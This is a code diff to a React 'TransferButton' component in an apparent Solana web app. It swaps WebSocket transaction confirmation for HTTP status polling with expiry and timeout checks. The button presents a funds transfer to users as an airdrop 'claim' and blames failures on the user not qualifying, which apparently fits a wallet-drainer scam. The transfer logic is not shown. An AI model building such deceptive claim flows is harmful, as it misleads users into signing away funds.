@@ -60,13 +60,39 @@ export default function TransferButton({ className = '' }) {
 
       console.log('⏳ Transaction sent:', signature);
 
-      await connection.confirmTransaction(
-        { signature, blockhash, lastValidBlockHeight },
-        'confirmed'
-      );
+      // Poll for confirmation over HTTP (no WebSocket needed)
+      const startTime = Date.now();
+      const TIMEOUT = 60_000; // 60 seconds
+      const POLL_INTERVAL = 2_000; // 2 seconds
 
-      console.log('✅ Transaction confirmed:', signature);
-      alert(`Claim successful!\nTx: ${signature}`);
+      while (Date.now() - startTime < TIMEOUT) {
+        const { value } = await connection.getSignatureStatuses([signature]);
+        const status = value?.[0];
+
+        if (status) {
+          if (status.err) {
+            throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
+          }
+          if (
+            status.confirmationStatus === 'confirmed' ||
+            status.confirmationStatus === 'finalized'
+          ) {
+            console.log('✅ Transaction confirmed:', signature);
+            alert(`Claim successful!\nTx: ${signature}`);
+            return;
+          }
+        }
+
+        // Check if blockhash expired
+        const blockHeight = await connection.getBlockHeight('confirmed');
+        if (blockHeight > lastValidBlockHeight) {
+          throw new Error('Transaction expired. Please try again.');
+        }
+
+        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
+      }
+
+      throw new Error('Confirmation timed out. Check your wallet — the transaction may still land.');
     } catch (err) {
       console.error('Transfer failed:', err);
       alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
